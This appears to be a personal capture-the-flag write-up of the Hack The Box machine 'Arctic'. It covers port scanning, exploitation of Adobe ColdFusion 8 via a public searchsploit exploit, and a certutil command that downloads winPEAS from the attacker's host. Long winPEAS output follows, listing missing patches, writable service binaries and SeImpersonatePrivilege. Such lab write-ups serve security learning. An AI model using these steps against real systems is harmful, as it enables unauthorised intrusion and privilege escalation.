# ARCTIC

Date: 2024-12-12
Target: `10.10.10.11`

Save in a target file:

```bash
echo 10.10.10.11 > target
```

Added also in the hosts file as `artic.htb`.

## Gain Access

### Port Scan Enumeration

I run a full tcp ports scan:

```bash
nmap -p- -v -iL=target -oN nmap/tcp_ports.txt
```

I discovered the following open ports:

* `135`
* `8500`
* `49154`

Performing an aggressive ports scan:

```bash
nmap -p135,8500,49154 -v -iL target -A -oN nmap/target_ports.txt -oX nmap/target_ports.txt

```

I haven't get any more information.
I tried to enumerate them with `telnet` and `nc`, but they did't give me any information.
On the browser I got a web page: `http://artic.htb:8500/`.

### HTTP - Port 8500

I found an administrator login page at: `http://artic.htb:8500/CFIDE/administrator/` and its an **Adobe Coldfusion 8**.
I search for a possibile vulnerability over the internet and I found it, then I used `searchsploit` and I found the same:

```bash
searchsploit Adobe Coldfusion 8
searchsploit -m 50057
```

![image](https://github.com/user-attachments/assets/1fe12b8e-0136-423b-925b-93fe40f8aebd)

I changed some configuration inside the file and I got the shell:

![image](https://github.com/user-attachments/assets/0ad09701-8968-4c4c-9f45-80530f2a3e6b)

## Privile Escalation

OS: `Microsoft Windows Server 2008 R2 Standard`

`certutil -UrlCache -f http://10.10.16.9:9878/winPEAS.bat wp.bat`

```
:\Users\tolis\AppData\Local\Temp>certutil -UrlCache -f http://10.10.16.9:9878/winPEAS.bat wp.bat
certutil -UrlCache -f http://10.10.16.9:9878/winPEAS.bat wp.bat
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\AppData\Local\Temp>.\wp.bat
.\wp.bat

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
   ((((((((((((((((* *****,,,/########## .(* ,((((((
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/###### /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by github.com/PEASS-ng


/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.
   Use it at your own networks and/or with the network owner's permission.

[*] BASIC SYSTEM INFO
 [+] WINDOWS OS
   [i] Check for vulnerabilities for the OS version with the applied patches
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          14/12/2024, 2:10:24 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.129 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.304 MB
Virtual Memory: In Use:    981 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11




"Microsoft Windows Server 2008 R2 Standard " 
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
MS04-020 patch is NOT installed 2K/SP4-POSIX)
MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)

 [+] DATE and TIME
   [i] You may need to adjust your local date/time to exploit some vulnerability
�?� 14/12/2024 
02:41 ��

 [+] Audit Settings
   [i] Check what is being logged

 [+] WEF Settings
   [i] Check where are being sent the logs

 [+] LAPS installed?
   [i] Check what is being logged

 [+] LSA protection?
   [i] Active if "1"


 [+] Credential Guard?
   [i] Active if "1" or "2"



 [+] WDigest?
   [i] Plain-text creds in memory if "1"

 [+] Number of cached creds
   [i] You need System-rights to extract them

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    CACHEDLOGONSCOUNT    REG_SZ    10

 [+] UAC Settings
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1


 [+] Registered Anti-Virus(AV)

Checking for defender whitelisted PATHS
 [+] PowerShell settings
PowerShell v2 Version:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
    PowerShellVersion    REG_SZ    2.0

PowerShell v5 Version:
Transcriptions Settings:
Module logging settings:
Scriptblog logging settings:

PS default transcript history

Checking PS history file

 [+] MOUNTED DISKS
   [i] Maybe you find something interesting
Caption  
C:       



 [+] ENVIRONMENT
   [i] Interesting information?

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\tolis\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=ARCTIC
ComSpec=C:\Windows\system32\cmd.exe
CurrentFolder=C:\Users\tolis\AppData\Local\Temp\
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT
E=0x1B[
expl=yes
FP_NO_HOST_CHECK=NO
LOCALAPPDATA=C:\Users\tolis\AppData\Local
long=false
NUMBER_OF_PROCESSORS=2
OS=Windows_NT
Path=C:\ColdFusion8\runtime\..\lib;C:\ColdFusion8\runtime\..\jintegra\bin;C:\ColdFusion8\runtime\..\jintegra\bin\international;C:\ColdFusion8\verity\k2\_nti40\bin;C:\ColdFusion9\verity\k2\_nti40\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
Percentage=1
PercentageTrack=19
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL=25
PROCESSOR_REVISION=0101
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
PUBLIC=C:\Users\Public
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\tolis\AppData\Local\Temp
TMP=C:\Users\tolis\AppData\Local\Temp
USERDOMAIN=ARCTIC
USERNAME=tolis
USERPROFILE=C:\Users\tolis
VERITY_CFG=C:\ColdFusion8\verity\k2\common\verity.cfg
windir=C:\Windows

 [+] INSTALLED SOFTWARE
   [i] Some weird software? Check for vulnerabilities in unknow software installed
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software

Common Files
Common Files
Internet Explorer
Internet Explorer
VMware
Windows Mail
Windows Mail
Windows NT
Windows NT
    InstallLocation    REG_SZ    C:\ColdFusion8
    InstallLocation    REG_SZ    C:\ColdFusion8\jnbridge
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\

 [+] Remote Desktop Credentials Manager
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager

 [+] WSUS
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus

 [+] RUNNING PROCESSES
   [i] Something unexpected is running? Check for vulnerabilities
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
smss.exe                       236 N/A                                         
csrss.exe                      320 N/A                                         
wininit.exe                    372 N/A                                         
csrss.exe                      380 N/A                                         
winlogon.exe                   416 N/A                                         
services.exe                   476 N/A                                         
lsass.exe                      484 SamSs                                       
lsm.exe                        492 N/A                                         
svchost.exe                    588 DcomLaunch, PlugPlay, Power                 
svchost.exe                    660 RpcEptMapper, RpcSs                         
LogonUI.exe                    740 N/A                                         
svchost.exe                    748 Dhcp, eventlog, lmhosts                     
svchost.exe                    792 AeLookupSvc, gpsvc, iphlpsvc, LanmanServer, 
                                   ProfSvc, Schedule, SENS, Winmgmt, wuauserv  
svchost.exe                    840 EventSystem, netprofm, nsi, W32Time,        
                                   WinHttpAutoProxySvc                         
svchost.exe                    892 TrkWks, UxSms, WdiSystemHost                
svchost.exe                    932 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                    252 BFE, DPS, MpsSvc                            
spoolsv.exe                    268 Spooler                                     
CF8DotNetsvc.exe              1040 ColdFusion 8 .NET Service                   
JNBDotNetSide.exe             1088 N/A                                         
conhost.exe                   1096 N/A                                         
jrunsvc.exe                   1144 ColdFusion 8 Application Server             
jrun.exe                      1172 N/A                                         
conhost.exe                   1180 N/A                                         
swagent.exe                   1196 ColdFusion 8 ODBC Agent                     
swstrtr.exe                   1216 N/A                                         
swsoc.exe                     1224 ColdFusion 8 ODBC Server                    
conhost.exe                   1232 N/A                                         
k2admin.exe                   1272 ColdFusion 8 Search Server                  
svchost.exe                   1424 RemoteRegistry                              
VGAuthService.exe             1472 VGAuthService                               
vmtoolsd.exe                  1744 VMTools                                     
ManagementAgentHost.exe       1780 VMwareCAFManagementAgentHost                
WmiPrvSE.exe                  2036 N/A                                         
k2server.exe                  2200 N/A                                         
conhost.exe                   2208 N/A                                         
k2index.exe                   2404 N/A                                         
conhost.exe                   2420 N/A                                         
svchost.exe                   2900 PolicyAgent                                 
dllhost.exe                   3064 COMSysApp                                   
msdtc.exe                     1136 MSDTC                                       
sppsvc.exe                    3880 sppsvc                                      
cmd.exe                        304 N/A                                         
conhost.exe                    688 N/A                                         
WmiPrvSE.exe                  2832 N/A                                         
TrustedInstaller.exe          3208 TrustedInstaller                            
tasklist.exe                  3328 N/A                                         

   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)
C:\ColdFusion8\runtime\bin\jrunsvc.exe ARCTIC\tolis:(I)(F)

C:\ColdFusion8\runtime\bin\jrun.exe ARCTIC\tolis:(I)(F)


   [i] Checking directory permissions of running processes (DLL injection)
C:\ColdFusion8\runtime\bin\ ARCTIC\tolis:(I)(OI)(CI)(F)

C:\ColdFusion8\runtime\bin\ ARCTIC\tolis:(I)(OI)(CI)(F)


 [+] RUN AT STARTUP
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup
C:\Documents and Settings\tolis\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                            ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\Documents and Settings\tolis\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(I)(F)
                                                                        ARCTIC\tolis:(I)(F)
 
C:\Users\tolis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                                             ARCTIC\tolis:(I)(OI)(CI)(F)
 
C:\Users\tolis\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(I)(F)
                                                                                         ARCTIC\tolis:(I)(F)
 

Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
AD RMS Rights Policy Template Management N/A                    Ready          

Folder: \Microsoft\Windows\Autochk
Proxy                                    N/A                    Ready          

Folder: \Microsoft\Windows\Customer Experience Improvement Program
Consolidator                             14/12/2024 6:00:00 ��  Could not start
KernelCeipTask                           19/12/2024 3:30:00 ��  Ready          
UsbCeip                                  15/12/2024 1:30:00 ��  Ready          

Folder: \Microsoft\Windows\Customer Experience Improvement Program\Server
ServerCeipAssistant                      14/12/2024 5:38:58 ��  Could not start
ServerRoleUsageCollector                 14/12/2024 1:15:10 ��  Could not start

Folder: \Microsoft\Windows\Defrag
ScheduledDefrag                          18/12/2024 2:28:43 ��  Ready          

Folder: \Microsoft\Windows\MemoryDiagnostic
CorruptionDetector                       N/A                    Ready          
DecompressionFailureDetector             N/A                    Ready          

Folder: \Microsoft\Windows\MUI
LPRemove                                 N/A                    Ready          

Folder: \Microsoft\Windows\Multimedia

Folder: \Microsoft\Windows\NetTrace
GatherNetworkInfo                        N/A                    Ready          

Folder: \Microsoft\Windows\PLA
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
AnalyzeSystem                            24/12/2024 6:46:12 ��  Ready          

Folder: \Microsoft\Windows\RAC
RacTask                                  14/12/2024 3:09:16 ��  Ready          

Folder: \Microsoft\Windows\Server Manager
ServerManager                            N/A                    Ready          

Folder: \Microsoft\Windows\Tcpip
IpAddressConflict1                       N/A                    Ready          
IpAddressConflict2                       N/A                    Ready          

Folder: \Microsoft\Windows\TextServicesFramework
MsCtfMonitor                             N/A                    Ready          

Folder: \Microsoft\Windows\Time Synchronization
SynchronizeTime                          15/12/2024 1:00:00 ��  Ready          

Folder: \Microsoft\Windows\Windows Error Reporting
QueueReporting                           N/A                    Ready          

Folder: \Microsoft\Windows\Windows Filtering Platform
BfeOnServiceStartTypeChange              N/A                    Ready          

Folder: \Microsoft\Windows\WindowsColorSystem

 [+] AlwaysInstallElevated?
   [i] If '1' then you can install a .msi file with admin privileges ;)
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated

[*] NETWORK
 [+] CURRENT SHARES

 [+] INTERFACES

Windows IP Configuration

   Host Name . . . . . . . . . . . . : arctic
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-94-3D-79
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.11(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{79F1B374-AC3C-416C-8812-BF482D048A22}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

 [+] USED PORTS
   [i] Check for services restricted from the outside
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:2522           0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:2930           0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:6085           0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:6086           0.0.0.0:0              LISTENING       1088
  TCP    0.0.0.0:7999           0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:8500           0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:9921           0.0.0.0:0              LISTENING       2200
  TCP    0.0.0.0:9951           0.0.0.0:0              LISTENING       1272
  TCP    0.0.0.0:9961           0.0.0.0:0              LISTENING       2404
  TCP    0.0.0.0:19997          0.0.0.0:0              LISTENING       1196
  TCP    0.0.0.0:19998          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       372
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       748
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       792
  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       1172
  TCP    0.0.0.0:49167          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49176          0.0.0.0:0              LISTENING       476
  TCP    10.10.10.11:139        0.0.0.0:0              LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       660
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:2522              [::]:0                 LISTENING       1172
  TCP    [::]:2930              [::]:0                 LISTENING       1172
  TCP    [::]:6085              [::]:0                 LISTENING       1172
  TCP    [::]:7999              [::]:0                 LISTENING       1172
  TCP    [::]:8500              [::]:0                 LISTENING       1172
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       372
  TCP    [::]:49153             [::]:0                 LISTENING       748
  TCP    [::]:49154             [::]:0                 LISTENING       792
  TCP    [::]:49159             [::]:0                 LISTENING       1172
  TCP    [::]:49167             [::]:0                 LISTENING       484
  TCP    [::]:49176             [::]:0                 LISTENING       476

 [+] FIREWALL

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
8500   TCP       Any      (null)

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .



Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
8500   TCP       Enable  Inbound               CF

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Disable

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
8500   TCP       Enable  Inbound               CF

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .



 [+] ARP

Interface: 10.10.10.11 --- 0xb
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-f4-88     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    

 [+] ROUTES
===========================================================================
Interface List
 11...00 50 56 94 3d 79 ......Intel(R) PRO/1000 MT Network Connection
  1...........................Software Loopback Interface 1
 12...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
 13...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2      10.10.10.11    266
       10.10.10.0    255.255.255.0         On-link       10.10.10.11    266
      10.10.10.11  255.255.255.255         On-link       10.10.10.11    266
     10.10.10.255  255.255.255.255         On-link       10.10.10.11    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link       10.10.10.11    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link       10.10.10.11    266
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    306 ::1/128                  On-link
  1    306 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

 [+] Hosts file

 [+] DNS CACHE

 [+] WIFI
[*] BASIC USER INFO
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups

 [+] CURRENT USER
User name                    tolis
Full Name                    tolis
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            22/3/2017 8:07:58 ��
Password expires             Never
Password changeable          22/3/2017 8:07:58 ��
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   14/12/2024 2:10:36 ��

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.

The request will be processed at a domain controller for domain HTB.


USER INFORMATION
----------------

User Name    SID                                          
============ =============================================
arctic\tolis S-1-5-21-2913191377-1678605233-910955532-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

 [+] USERS

User accounts for \\ARCTIC

-------------------------------------------------------------------------------
Administrator            Guest                    tolis                    
The command completed successfully.


 [+] GROUPS

Aliases for \\ARCTIC

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.


 [+] ADMINISTRATORS GROUPS
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

 
 [+] CURRENT LOGGED USERS
 
 [+] Kerberos Tickets

Current LogonId is 0:0x133a7

Cached Tickets: (0)
 
 [+] CURRENT CLIPBOARD
   [i] Any passwords inside the clipboard?


[*] SERVICE VULNERABILITIES

 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe NT SERVICE\TrustedInstaller:(F)

C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe ARCTIC\tolis:(I)(F)

C:\ColdFusion8\runtime\bin\jrunsvc.exe ARCTIC\tolis:(I)(F)

C:\ColdFusion8\db\slserver54\bin\swagent.exe  ARCTIC\tolis:(I)(F)

C:\ColdFusion8\db\slserver54\bin\swstrtr.exe  ARCTIC\tolis:(I)(F)

C:\ColdFusion8\verity\k2\_nti40\bin\k2admin.exe ARCTIC\tolis:(I)(F)

C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)

C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(I)(F)

C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)

C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe BUILTIN\Administrators:(I)(F)

C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe BUILTIN\Administrators:(I)(F)


